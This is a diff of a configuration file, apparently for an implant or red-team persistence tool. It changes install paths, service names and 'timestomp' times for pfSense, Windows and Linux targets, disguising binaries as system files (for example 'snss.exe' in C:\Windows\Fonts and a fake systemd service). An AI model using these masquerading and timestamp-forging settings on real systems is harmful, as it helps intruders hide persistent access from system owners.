@@ -1,11 +1,11 @@
-#pfsense_binary: "/usr/bin/ipfw_netblock"
-#pfsense_service: "/etc/rc.d/ipfw_netblock"
-#pfsense_service_name: "ipfw_netblock"
-#pfsense_shell: "/usr/local/etc/rc.d/ipfw_netblock.sh"
-pfsense_binary: "/usr/bin/ibv_ub_pingpong"
-pfsense_service: "/etc/rc.d/bsd"
-pfsense_service_name: "bsd"
-pfsense_shell: "/usr/local/etc/qemu-local-agent"
+pfsense_binary: "/usr/bin/bsdzip"
+pfsense_service: "/etc/rc.d/ipfw_netblock"
+pfsense_service_name: "ipfw_netblock"
+pfsense_shell: "/usr/local/etc/rc.d/dhcpc"
+#pfsense_binary: "/usr/bin/getty"
+#pfsense_service: "/etc/rc.d/bsd"
+#pfsense_service_name: "bsd"
+#pfsense_shell: "/usr/local/etc/qemu-local-agent"
 windows_binary: "C:\\Windows\\Fonts\\snss.exe"
 windows_binary_directory: "C:\\Windows\\Fonts"
 windows_binary_name: "snss.exe"
@@ -16,5 +16,6 @@ linux_service: "/lib/systemd/system/systemd-boot-system-key.service"
 linux_service_name: "systemd-boot-system-key"
 # linux_timestomp_time: "202309200815.15" #change depending on comp
 # backgammon_timestomp_time: "202309191257.15" #change depending on comp
-# timestomp_time: "202304070000.00" #bsd
-timestomp_time: "202201310000.00" #router
+#timestomp_time: "202304070000.00" #bsd
+timestomp_time: "202306280437.01" #router
+#timestomp_time: "202309200815.01"
